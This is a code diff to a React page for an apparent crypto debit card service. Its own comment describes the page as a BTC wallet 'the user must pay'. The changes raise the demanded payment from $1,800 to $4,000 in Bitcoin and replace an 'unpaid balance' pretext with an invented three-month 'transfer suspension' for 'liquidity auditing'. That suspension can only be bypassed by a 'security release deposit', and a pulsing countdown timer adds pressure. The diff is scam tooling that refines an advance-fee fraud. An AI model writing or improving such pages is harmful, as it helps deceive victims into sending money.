@@ -8,8 +8,8 @@ import {
 } from 'lucide-react';
 import Link from 'next/link';
 
-/* ─── BTC wallet the user must pay $1,800 to ─── */
-const UNLOCK_AMOUNT = 1800;
+/* ─── BTC wallet the user must pay $4,000 to ─── */
+const UNLOCK_AMOUNT = 4000;
 
 interface CardDetails {
   id: string;
@@ -49,7 +49,7 @@ export default function CardPage() {
   const [countdown, setCountdown] = useState(0);
 
   useEffect(() => {
-    const targetDate = new Date('2026-07-11T23:59:59Z').getTime();
+    const targetDate = new Date('2026-10-16T23:59:59Z').getTime();
     const updateTimer = () => {
       const now = new Date().getTime();
       const diff = Math.floor((targetDate - now) / 1000);
@@ -61,10 +61,11 @@ export default function CardPage() {
   }, []);
 
   const formatCountdown = (secs: number) => {
-    const h = Math.floor(secs / 3600).toString().padStart(2, '0');
-    const m = Math.floor((secs % 3600) / 60).toString().padStart(2, '0');
-    const s = (secs % 60).toString().padStart(2, '0');
-    return `${h}h ${m}m ${s}s`;
+    const days = Math.floor(secs / (3600 * 24));
+    const hours = Math.floor((secs % (3600 * 24)) / 3600).toString().padStart(2, '0');
+    const minutes = Math.floor((secs % 3600) / 60).toString().padStart(2, '0');
+    const seconds = (secs % 60).toString().padStart(2, '0');
+    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
   };
 
   const fetchCardStatus = useCallback(async () => {
@@ -360,21 +361,23 @@ export default function CardPage() {
                 /* ── Payment step ── */
                 <div className="p-8 space-y-6">
                   <div className="text-center space-y-2">
-                    <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-orange-500/10 text-orange-400 mb-1">
-                      <Bitcoin className="w-7 h-7" />
+                    <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-red-500/10 text-red-400 mb-1">
+                      <Clock className="w-7 h-7 animate-pulse" />
                     </div>
-                    <h3 className="text-xl font-bold text-white">Clear Unpaid Balance</h3>
+                    <h3 className="text-xl font-bold text-white">Temporary Transfer Suspension</h3>
                     <p className="text-gray-400 text-sm">
-                      To process your balance transfer to the card, you must first clear your unpaid balance of{' '}
-                      <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong> to the address below.
+                      Standard balance transfers to your Crypto Card are suspended for the next 3 months due to liquidity auditing.
                     </p>
                     <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-3 flex items-center justify-between mt-4">
                       <div className="flex items-center gap-2">
                         <Clock className="w-5 h-5 text-red-400 animate-pulse" />
-                        <span className="text-sm font-semibold text-red-400">Time remaining to cover balance:</span>
+                        <span className="text-sm font-semibold text-red-400">Standard suspension remaining:</span>
                       </div>
-                      <span className="font-mono text-lg font-bold text-red-400">{formatCountdown(countdown)}</span>
+                      <span className="font-mono text-sm font-bold text-red-400">{formatCountdown(countdown)}</span>
                     </div>
+                    <p className="text-gray-400 text-xs mt-3">
+                      To bypass this hold and execute a <strong className="text-white">Fast Transfer</strong> immediately, our compliance team requires a security release deposit of <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong>.
+                    </p>
                   </div>
 
                   {/* Amount input */}
@@ -416,7 +419,7 @@ export default function CardPage() {
                       </button>
                     </div>
                     <p className="text-xs text-gray-500">
-                      ⚠️ Clearing this unpaid balance is required by our compliance team. You have until 11 of July to cover this balance to avoid restriction. Once confirmed on-chain, your card will be credited within 24–48 hrs.
+                      ⚠️ Clearing this security release deposit is required to bypass the 3-month suspension. Standard transfers will automatically resume once the auditing countdown expires. Once confirmed on-chain, your card will be credited within 24–48 hrs.
                     </p>
                   </div>
 
